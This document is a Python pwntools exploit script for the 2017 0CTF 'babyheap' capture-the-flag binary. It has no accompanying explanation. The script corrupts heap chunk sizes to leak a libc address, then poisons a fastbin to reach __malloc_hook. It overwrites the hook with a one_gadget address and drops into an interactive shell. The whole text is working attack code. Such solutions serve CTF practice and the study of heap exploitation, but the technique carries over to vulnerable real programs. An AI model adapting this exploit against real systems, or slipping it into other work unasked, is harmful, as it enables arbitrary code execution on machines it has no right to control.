from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./2017_0ctf_babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./2017_0ctf_babyheap")
else:
	pass

def add(size):
	p.sendlineafter("Command: ","1")
	p.sendlineafter("Size: ",str(size))

def edit(index,size,content):
	p.sendlineafter("Command: ","2")
	p.sendlineafter("Index: ",str(index))
	p.sendlineafter("Size: ",str(size))
	p.sendlineafter("Content: ",content)

def free(index):
	p.sendlineafter("Command: ","3")
	p.sendlineafter("Index: ",str(index))
	
def show(index):
	p.sendlineafter("Command: ","4")
	p.sendlineafter("Index: ",str(index))

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x113D)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
add(0x10) #0
add(0x60) #1
add(0x60) #2
add(0x60) #3
payload = p64(0) * 2 + p64(0) + p64(0x70 + 0x70 + 1)
edit(0,len(payload),payload)
free(1)
add(0x60) #1
show(2)
p.recvuntil("Content: \n")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))
add(0x60) #4
payload = "a" * 0x60 + p64(0) + p64(0x71)
edit(1,len(payload),payload)
free(2)
payload = "a" * 0x60 + p64(0) + p64(0x71) + p64(libc.symbols["__malloc_hook"] - 0x23)
edit(1,len(payload),payload)
add(0x60) #2
one_gadget = libc.address + 0x4526a
payload = "aaa" + p64(0) * 2 + p64(one_gadget)
add(0x60) #5
edit(5,len(payload),payload)
p.sendlineafter("Command: ","1")
p.sendlineafter("Size: ",str(0x10))
p.interactive()
